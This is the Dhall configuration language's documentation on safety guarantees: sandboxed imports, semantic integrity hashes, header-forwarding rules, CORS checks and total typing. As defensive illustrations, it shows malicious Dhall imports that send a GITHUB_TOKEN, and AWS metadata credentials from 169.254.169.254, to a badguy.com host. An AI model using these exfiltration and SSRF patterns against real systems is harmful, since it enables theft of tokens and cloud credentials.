# Safety Guarantees

> Study how Dhall configuration files provide programming language features without sacrificing safety

```eval_rst
.. contents:: Table of Contents
   :backlinks: none
```

The Dhall configuration language is designed to be programmable without
sacrificing safety.  This section explains in detail what safety guarantees the
language provides for security-conscious people comparing Dhall to other
configuration alternatives.

This section assumes some familiarity with the language.  If you haven't tried
Dhall yet then a good starting point is Dhall's
[JSON integration][json-tutorial].

## Effects

A [programmable configuration language][programmable] is a configuration
language that provides tools to reduce repetition.  Some configuration file
formats use existing programming languages for this purpose, such as:

* [webpack][webpack] - A tool for bundling assets that can use multiple
  languages (such as TypeScript) to configure its behavior
* [django][django] - A web framework that uses Python as the configuration
  language
* [sbt][sbt] - A Scala build tool which is also configured via the Scala
  programming language

These fully featured programming languages lie at one extreme of the power
spectrum: they provide great flexibility, but you cannot safely run untrusted
code.  Such configuration files could delete files or exfiltrate sensitive
data because the configuration language supports arbitrary effects.  You can't
know for sure whether the configuration file is safe unless you either trust or
audit the code (and auditing a Turing-complete language is difficult).

A programmable configuration language can protect against this by evaluating
code within a secure sandbox that only permits a blessed set of effects.  For
example, the Dhall language is not a general purpose language and only supports
three ways to interact with the outside world, all of which are related to
importing Dhall expressions from external sources:

* Importing expressions from a file path (absolute, relative, or home-anchored)
* Importing expressions using an HTTP/HTTPS request to a web service
* Importing expressions from an environment variable

Other than importing values, a Dhall configuration file only computes a pure
value used to configure some larger program.  The only other interactions with
the outside world are mediated through that larger program.

## Code injection

The following configuration file is a valid Dhall expression that:

* imports a `concatSep` function from a web service
* imports the user's name from the `USER` environment variable
* imports a type from a relative file located at `./schema.dhall`

```dhall
let concatSep = https://prelude.dhall-lang.org/Text/concatSep

in    { name = env:USER as Text
      , age = 23
      , hobbies = concatSep ", " [ "piano", "reading", "skiing" ]
      }
    : ./schema.dhall
```

Normally importing values from external sources is potentially unsafe,
especially if imported from a web service.  An untrusted web service could
inject unexpected code into your configuration by serving a new expression when
you're not looking.

Dhall provides two complementary features to secure expressions imported from
untrusted sources:

* You can audit any expression by eliminating all indirection
* After auditing an expression you can freeze the import with an integrity check

To illustrate this, suppose that you are authoring the above code and depending
on the imported `concatSep` function for the first time.  You can use the
command-line interpreter named `dhall` to retrieve, type-check, and remove all
indirection in the expression, like this:

```console
$ dhall --annotate <<< 'https://prelude.dhall-lang.org/Text/concatSep'
```

```dhall
  ( λ(separator : Text) →
    λ(elements : List Text) →
      merge
        { Empty = "", NonEmpty = λ(result : Text) → result }
        ( List/fold
            Text
            elements
            < Empty | NonEmpty : Text >
            ( λ(element : Text) →
              λ(status : < Empty | NonEmpty : Text >) →
                merge
                  { Empty = < Empty | NonEmpty : Text >.NonEmpty element
                  , NonEmpty =
                      λ(result : Text) →
                        < Empty | NonEmpty : Text >.NonEmpty
                          "${element}${separator}${result}"
                  }
                  status
            )
            < Empty | NonEmpty : Text >.Empty
        )
  )
: ∀(separator : Text) → ∀(elements : List Text) → Text
```

The `--annotate` flag adds a type annotation to the end of the expression,
which summarizes what the function does:

```dhall
: ∀(separator : Text) → ∀(elements : List Text) → Text
```

The expression preceding the type annotation is the "normal form" of the
expression (i.e. the expression with all indirection removed).  This
indirection-free normal form is what you audit when examining untrusted code.
Every Dhall expression has a canonical normal form because the Dhall configuration
language is not Turing-complete.

If you understand and trust what you see then you can freeze the import using
an integrity check.  If you replace the `dhall` command with `dhall hash`:

```dhall
$ dhall hash <<< 'https://prelude.dhall-lang.org/Text/concatSep'
```

```
sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a
```

... then you will get a hash that you can append to an import to freeze the
imported expression, like this:

```dhall
let concatSep =
      https://prelude.dhall-lang.org/Prelude/Text/concatSep sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a

in    { name = env:USER as Text
      , age = 23
      , hobbies = concatSep ", " [ "piano", "reading", "skiing" ]
      }
    : ./schema.dhall
```

You can also automatically freeze all imports within a file using
the following command:

```console
$ dhall freeze --inplace ./example.dhall
```

An import frozen in this way can never successfully return a different
expression.  If the above URL tried to serve a new expression then the integrity
check would fail and the interpreter would reject the configuration file.  This
means that a malicious actor would not be able to modify the behavior of our
program by serving a new `concatSep` function with the same type but different
behavior.  The worst they can do is cause the program to fail loudly if they
tamper with the import in any way.

The integrity check is not a hash of the text of the import because the textual
payload of an import does not uniquely determine the import's meaning.  To see
why, suppose that the following contrived configuration file imports a boolean
value from another file named `./bool.dhall`, like this:

```dhall
[ True, ./bool.dhall ]
```

... and the `./bool.dhall` file contains yet another reference to file named
`./number.dhall`:

```dhall
-- ./bool.dhall

Natural/even ./number.dhall
```

... where `./number.dhall` might contain:

```dhall
-- ./number.dhall

4
```

We cannot protect the `./bool.dhall` import using a textual hash of the file
because the configuration file's result could still change if we modify the
`./number.dhall` file to store a new value (like `5`).  Modifications to
`./number.dhall` would go undetected because they would not disturb the textual
hash of `./bool.dhall`.

Dhall's integrity checks are "semantic" integrity checks, meaning that they are
hashes of an expression's normal form.  This ensures that any change to an
expression (even via transitive dependencies) will be detected and rejected by
the integrity check.  As a bonus, the semantic integrity check does not reject
behavior-preserving changes so refactoring code or adding/removing
whitespace/comments won't disturb the hash.

## Cross-site scripting (XSS)

One potential security breach would be using Dhall's import system to leak
information about your environment or exfiltrate data to an untrusted source.

Revisiting our previous example:

```dhall
let concatSep =
      https://prelude.dhall-lang.org/Prelude/Text/concatSep sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a

in    { name = env:USER as Text
      , age = 23
      , hobbies = concatSep ", " [ "piano", "reading", "skiing" ]
      }
    : ./schema.dhall
```

... the host at `https://prelude.dhall-lang.org` would be able to detect the first
time we interpret our Dhall program by detecting an HTTP request for
`https://prelude.dhall-lang.org/Prelude/Text/concatSep`.  Leaking the
presence of an HTTP request at least once is unavoidable if you do not control the
web service hosting the URL.  However, when you protect an import with a semantic
integrity check the import is permanently locally cached after the first request,
so subsequent imports will no longer make outbound HTTP requests.

Another potential attack vector is Dhall's support for custom HTTP/HTTPS headers.
For example, you can import Dhall expressions from private GitHub repositories
by authorizing the request with a secure token, like this:

```dhall
https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/someExpression.dhall
    using [ { header = "Authorization", value = "token ${env:GITHUB_TOKEN as Text}" } ]
          -- The above line authorize the request
```

This would be dangerous if a malicious Dhall expression that you imported tried
to exfiltrate sensitive files or credentials through an HTTPS request to a web
service they control with data stuffed in custom headers.  This would be the
the closest Dhall analog to a [cross-site scripting (XSS)][xss] attack.

Dhall protects against leaking sensitive files and environment variables by
restricting transitive imports of remote expressions.  Specifically, expressions
imported from a web service can only transitively import expressions from other
web services and they cannot import expressions from your local files or
your environment variables.

This means that if an attacker tried to steal your `GITHUB_TOKEN` by hosting the
following malicious expressions:

```dhall
-- https://badguy.com/pleaseImportMe.dhall

https://badguy.com/iRecordHeaders.dhall
  using [ { header = "Authorization", value = "token ${env:GITHUB_TOKEN as Text}" } ]
```

... then Dhall interpreter would reject any attempt to import
`https://badguy.com/pleaseImportMe.dhall` because this expression imported
from a web service indirectly requested access to your `GITHUB_TOKEN`
environment variable.

The Dhall language also does not allow "computed imports" (i.e. imports where
the import path depends on a value within the configuration file).  This
prevents information from being leaked through the requested path.  Similarly,
the language does not permit conditional importing of values.  The interpreter
is "strict" and always resolves imports regardless of whether the imported
expressions are used. Therefore, the set of imports your program fetches cannot
be used to leak program state.  At most the imports will reveal what you have
not yet locally cached, but nothing else.

## Same origin policy

Dhall expressions imported from a web service can reference other expressions
hosted at the same domain via relative imports.  For example, if you import an
expression from `example.com`, like this:

```dhall
https://example.com/list.dhall
```

... and the expression hosted there is:

```dhall
[ 1, 2, ./natural.dhall ]
```

... then the interpreter will expand `./natural.dhall` to
`https://example.com/natural.dhall`.  This feature allows expressions with
relative imports to continue to function when hosted from a web service.

However, this feature also requires support for automatically forwarding any
custom headers to expressions imported via relative imports.  For example, if
you import an expression from a private GitHub repository, like this:

```dhall
https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/someExpression.dhall
    using [ { header = "Authorization", value = "token ${env:GITHUB_TOKEN as Text}" } ]
```

... and `https://.../someExpression.dhall` contains a relative import of
`./anotherExpression.dhall` then:

* the interpreter will canonicalize the relative import
  `./anotherExpression.dhall` to the fully qualified import
  `https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/anotherExpression.dhall`
* the interpreter will make an HTTPS request for
  `https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/anotherExpression.dhall`
  using the same `Authorization` header containing the user's GitHub API token

This is the Dhall version of the "same origin policy".  Dhall expressions hosted
within a domain can reuse headers that were supplied for any other expression
residing in the same domain.  This feature allows expressions with relative
imports to continue to function when protected by a service that requires
authorization.

Imported expressions cannot transfer sensitive headers in this way to other
domains.  Custom headers are only transferred for relative imports, which can
only reference expressions from the same domain.  The only way for an expression
imported from one domain to import an expression from a different domain is
through a non-relative fully qualified import to that other domain.  Such a
fully qualified import to another domain resets the headers, preventing them
from leaking across domains.

## Server-side request forgery

What if you imported an expression from `https://badguy.com/pleaseImportMe.dhall` which
contained the following contents:

```dhall
https://badguy.com/iRecordHeaders.dhall
    using
    [ { header = "Credentials"
      , value = http://169.254.169.254/latest/meta-data/iam/security-credentials/role as Text
      }
    ]
```

This would be an example of "server-side request forgery", which attempts
to trick the client into making an unexpected request for sensitive data on
behalf of the malicious server.  The above URL is a sensitive endpoint that
AWS EC2 instances can use to obtain sensitive security credentials but the
endpoint is not meant to be publicly available.

The language protects against by providing built-in support for
[Cross-origin resource sharing (CORS)](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing),
so that transitive imports must opt in to answering transitive requests made on
a client's behalf.  This protection blocks the above exploit because the
interpreter will check if a transitive import like
`http://169.254.169.254/latest/meta-data/iam/security-credentials/role`
supports CORS (it does not) and will therefore reject the request.

## Types

Not all programmable configuration files use general-purpose languages.  Some of
them use languages designed specifically for program configuration, such as:

* [Jsonnet][jsonnet] - JSON extended with programming language features
* [Sass][sass] - CSS extended with programming language features
* [HCL][hcl] - JSON-compatible programmable configuration language

These languages sacrifice some power in exchange for additional safety.  Similar
to Dhall, these languages all provide programming features while restricting
the set of allowed effects, usually limited to importing/including other files.

However, we'd like to provide additional safety guarantees beyond just limiting
effects.  We also want to be able to validate the correctness of configuration
files before running the program that they configure.

Usually programmers validate their configuration files ahead-of-time when:

*   Reliability matters

    As [Dan Luu][danluu] explains:

    > Configuration bugs, not code bugs, are the most common cause I've seen of
    > really bad outages. When I looked at publicly available postmortems,
    > searching for “global outage postmortem” returned about 50% outages caused
    > by configuration changes. Publicly available postmortems aren't a
    > representative sample of all outages, but a random sampling of postmortem
    > databases also reveals that config changes are responsible for a
    > disproportionate fraction of extremely bad outages. As with error
    > handling, I'm often told that it's obvious that config changes are scary,
    > but it's not so obvious that most companies test and stage config changes
    > like they do code changes.

*   Testing the program wastes computational resources

    Example: You are running an expensive analytics job and you don't want to
    launch hundreds of nodes only to discover that there is a typo in your
    job's configuration file

*   The development feedback loop is slow

    Example: You are configuring a program that takes a long time to compile or
    run the full suite of tests

*   The program is run non-interactively

    Example: You are configuring a program that runs periodically and you don't
    want to be paged on nights or weekends when the program fails on unexpected
    input

Non-programmable configuration file formats (like JSON) usually support
ahead-of-time validation through support for schemas (like
[JSON schema][json-schema]).  However, programmable configuration languages
usually don't support ahead-of-time validation because the programming analog of
a schema is a type system and most of these languages lack a type system.

Dhall's type system guarantees that if a Dhall configuration file type checks
then program evaluation/normalization will never fail.  Specifically, a Dhall	configuration file will never:

* throw an exception
* crash or segfault
* accept malformed input
* produce malformed output
* hang or time out

Dhall's strict type system allows you to rule out all of the above failure
modes ahead-of-time before loading the configuration file into any program.

## Turing-completeness

Dhall is not a Turing-complete programming language, which is why Dhall's type
system can provide safety guarantees on par with non-programmable configuration
file formats.  Specifically, Dhall is a ["total"][total] functional programming
language, which means that:

* You can always type-check an expression in a finite amount of time
* If an expression type-checks then evaluating that expression always succeeds
  in a finite amount of time

Note that a "finite amount of time" can still be very long.  For example, there
are some short pathological programs that take longer than the heat death of the
universe to evaluate.  The main benefit of evaluation being finite is not to
eliminate long-running programs but to make them significantly less probable.
In practice, you will discover that you will rarely author a configuration file
that takes a long time to evaluate by accident.

For example, Dhall does not provide language support for recursion.  If you try
to define a recursive expression or function you will get a type error.  Lists
are the only recursive data structure and the only way to build or consume
lists is through safe primitives guaranteed to terminate, like `List/fold`.
This restrictive programming style keeps code simple and makes expensive code
more obvious (both to the code author and reviewer).

## Handling program failure

Just because a computation succeeds does not mean that the computation will
return a useful result.  For example, the following expression succeeds, but
returns an empty value:

```console
$ dhall <<< 'List/head Natural ([] : List Natural)'
```
```dhall
None Natural
```

This is because `List/head` returns an `Optional` result which will be empty
if the input list is empty.

"Success" has a specific meaning in a total functional programming language.
In this context, "success" means that a potentially empty or failed result is
not allowed where the type system expects a successful result.  Also, everything
is present by default: you have to explicitly opt in to handling potentially
empty or failed values.

For example, you can add any two `Natural` numbers using the `+` operator:

```console
$ dhall <<< '2 + 3'
```
```dhall
5
```

... but you can not add an `Optional Natural` number to a `Natural` number.
You will get a type error if you try to do so, such as in the following
anonymous function:

```dhall
\(x : Optional Natural) -> x + 3  -- Type error
```

This is automatically an error even if you have not yet called the function
with any argument.  The type system rejects the function definition even in
isolation.

You have to explicitly modify the function to handle the `Optional` input by
specifying what do to if the value is absent, typically by using `merge`:

```dhall
\(o : Optional Natural) ->
  -- Default `x` to `0` if `x` is absent
  let x = merge { None = 0, Some = \(n : Natural) -> n } o

  in x + 3
```

This benefit also applies to your configuration file's schema.  If your
program expects a configuration file of type:

```dhall
{ name : Text
, age : Natural
, hobbies : Text
}
```

... then the type system guarantees that none of those values will be absent
since every type (such as `Natural` or `Text`) is automatically non-`Optional`
by default.  Your configuration file has to explicitly opt in to accepting
empty or otherwise failed values and the type system then polices your input
for you.

## Conclusions

This tutorial compares Dhall to other configuration languages along multiple
dimensions because the safety features that are relevant will depend on the
comparison.  You might care more about the absence of unrestricted effects when
comparing to a general-purpose programming language whereas you might care more
about the type system when comparing to a special-purpose configuration
language.

Keep in mind that there is no single feature that makes a language safe in
absolute terms.  Safety is a function of your project requirements and threat
model.  In many cases you can't be perfectly safe, but you also don't have to
be needlessly unsafe.  To make an analogy, just because seatbelts don't prevent
all fatalities doesn't mean that you shouldn't wear them.

If you have additional questions about safety concerns or requirements not
covered in this tutorial, open an issue in this repository requesting an
expansion to this document.

[danluu]: https://danluu.com/postmortem-lessons/
[django]: https://docs.djangoproject.com/en/2.0/topics/settings/
[hcl]: https://www.terraform.io/docs/configuration/syntax.html
[jsonnet]: https://jsonnet.org/
[json-schema]: https://json-schema.org/
[json-tutorial]: https://github.com/dhall-lang/dhall-lang/wiki/Getting-started:-Generate-JSON-or-YAML
[programmable]: https://github.com/dhall-lang/dhall-lang/wiki/Programmable-configuration-files
[sass]: https://sass-lang.com/
[sbt]: https://www.scala-sbt.org/
[webpack]: https://webpack.js.org/configuration/configuration-languages/
[total]: https://en.wikipedia.org/wiki/Total_functional_programming
[xss]: https://en.wikipedia.org/wiki/Cross-site_scripting
